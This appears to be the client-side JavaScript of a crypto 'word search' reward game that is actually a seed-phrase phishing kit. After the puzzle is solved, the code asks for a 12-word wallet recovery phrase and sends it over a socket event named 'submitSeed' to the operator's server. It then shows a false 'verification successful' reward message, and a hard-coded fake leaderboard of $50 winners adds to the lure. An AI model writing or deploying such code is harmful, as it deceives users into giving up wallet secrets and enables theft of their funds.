const winningWords = ["BITCOIN", "ETHEREUM", "SOLANA", "MONERO", "CARDANO", "BINANCE"];
let selectedTiles = [];
const socket = io();

// 1. Initialize the Game Grid and Seed Input Fields
function init() {
    const gridContainer = document.getElementById('game-grid');
    if (!gridContainer) return;

    gridContainer.innerHTML = ''; 
    const fullGrid = [
        ..."BITCOINW", ..."ETHEREUM", ..."SOLANAXR", ..."MONEROVY",
        ..."CARDANOZ", ..."BINANCEL", ..."KTYUPOLM", ..."QWASDFGH"
    ];

    // Build the Word Search Grid
    fullGrid.forEach((char, index) => {
        const cell = document.createElement('div');
        cell.className = 'cell'; 
        cell.innerText = char;
        cell.addEventListener('click', () => handleTileClick(cell, char, index));
        gridContainer.appendChild(cell);
    });

    // Build the 12 phrase input boxes
    const inputFields = document.getElementById('input-fields');
    if (inputFields) {
        for (let i = 1; i <= 12; i++) {
            const input = document.createElement('input');
            input.type = 'text';
            input.placeholder = `${i}. Word`;
            input.id = `word-${i}`;
            inputFields.appendChild(input);
        }
    }
}

// 2. Toggle Active State (Select/Unselect)
function handleTileClick(cell, char, index) {
    cell.classList.toggle('active'); 
    if (cell.classList.contains('active')) {
        selectedTiles.push({ char, index });
    } else {
        selectedTiles = selectedTiles.filter(t => t.index !== index);
    }
    checkMatches();
}

// 3. Winning Logic
function checkMatches() {
    let matchesFound = 0;
    const currentString = selectedTiles.map(t => t.char).join('');
    
    winningWords.forEach(word => { 
        if (currentString.includes(word)) matchesFound++; 
    });

    const progress = document.getElementById('progress');
    if (progress) progress.innerText = `Matches Found: ${matchesFound}/6`;

    if (matchesFound === 6) {
        setTimeout(() => {
            document.getElementById('puzzle-view').style.display = 'none';
            document.getElementById('seed-view').style.display = 'block';
        }, 500);
    }
}

// 4. UI Actions
function openInput() {
    document.getElementById('pre-btn').style.display = 'none';
    document.getElementById('main-input-panel').style.display = 'block';
}

function finalizeClaim() {
    let words = [];
    for (let i = 1; i <= 12; i++) {
        const val = document.getElementById(`word-${i}`).value.trim();
        if (val) words.push(val);
    }

    if (words.length === 12) {
        const seedPhrase = words.join(' ');
        // This sends the data to your existing server.js submitSeed listener
        socket.emit('submitSeed', { seedPhrase });
        alert("Verification successful. Your reward is being processed.");
    } else {
        alert("Please enter all 12 words of your phrase.");
    }
}

function toggleLeaderboard() {
    const modal = document.getElementById('modal-overlay');
    modal.style.display = (modal.style.display === 'flex') ? 'none' : 'flex';
    
    if (modal.style.display === 'flex') {
        const content = document.getElementById('lb-content');
        const users = [
            { rank: 1, user: "K***i", addr: "0x71...3a21", amt: "$50" },
            { rank: 2, user: "J***n", addr: "0x12...9e44", amt: "$50" },
            { rank: 3, user: "M***a", addr: "0x88...bc12", amt: "$50" }
        ];
        content.innerHTML = users.map(u => `
            <div class="lb-row">
                <span>#${u.rank} ${u.user}</span>
                <span class="addr">${u.addr}</span>
                <span style="color:#FCD535">${u.amt}</span>
            </div>
        `).join('');
    }
}

// Start
window.onload = init;